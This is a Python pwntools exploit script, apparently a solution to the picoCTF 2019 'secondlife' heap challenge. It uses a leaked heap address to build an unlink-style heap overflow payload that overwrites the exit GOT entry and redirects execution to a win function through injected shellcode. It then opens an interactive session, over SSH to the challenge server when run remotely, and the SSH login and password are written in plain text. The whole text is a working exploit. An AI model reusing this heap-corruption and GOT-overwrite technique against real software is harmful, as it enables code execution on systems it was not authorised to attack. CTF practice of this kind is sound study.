import binascii
from pwn import *
import sys
from struct import pack


BINARY = './vuln'
context.terminal = ['tmux', 'splitw', '-h']


def attach_gdb(sh):
    gdb.attach(sh)


def P32(v):
    return pack('I', v)


def P64(v):
    return pack('Q', v)


def deHex(v):
    return binascii.unhexlify(v)[::-1]


def start():

    if args["REMOTE"]:
        s = ssh(host='2019shell1.picoctf.com',
                user='mikon', password="password")
        sh = s.process(
            'vuln', cwd='/problems/secondlife_4_5c2075e2c32bb7f481b1d866564b1f26')
    else:
        sh = process('./vuln',
                     stdout=process.PTY, stdin=process.PTY)

    if args["GDB"]:
        attach_gdb(sh)
    return sh


'''
struct chunk {
    int prev_size;
    int size;
    struct chunk *fd;  // forward pointer
    struct chunk *bk;  // backward pointer
};

*(next->fd + 12) = next->bk
*(next->bk+ 8) = next->fd

'''


def main():
    sh = start()

    exitGot = 0x804d02c
    sh.recvline()
    leak = sh.recvline()
    leak = int(leak)
    print(hex(leak))

    payload = ''
    payload += P32(exitGot-0xc)  # write in fd_ptr
    payload += P32(leak + 0x8)  # write in bk_ptr
    payload += asm('mov eax, 0x08048956;call eax;')

    sh.sendline('aaaddddda')
    sh.sendline(payload)

    sh.interactive()


if __name__ == '__main__':
    main()
